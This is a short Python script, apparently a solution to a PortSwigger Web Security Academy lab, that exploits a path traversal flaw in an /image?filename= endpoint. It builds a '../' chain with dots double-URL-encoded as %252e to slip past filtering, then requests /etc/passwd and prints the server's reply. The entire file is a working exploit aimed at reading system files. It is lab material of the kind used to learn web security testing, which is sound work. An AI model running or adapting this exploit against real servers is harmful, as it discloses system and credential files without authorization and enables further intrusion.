import requests

DOMAIN = "0a1e00590371b6c68271575f00bf00dc.web-security-academy.net"

def get_file_content(path):
    raw_payload = "../" * 5 + path
    payload = ""

    for p in raw_payload:
        if p == ".":
            payload += "%252e"
        else:
            payload += p
    print(payload)
    response = requests.get(f"https://{DOMAIN}/image?filename={payload}")
    print(response.text)

get_file_content("/etc/passwd")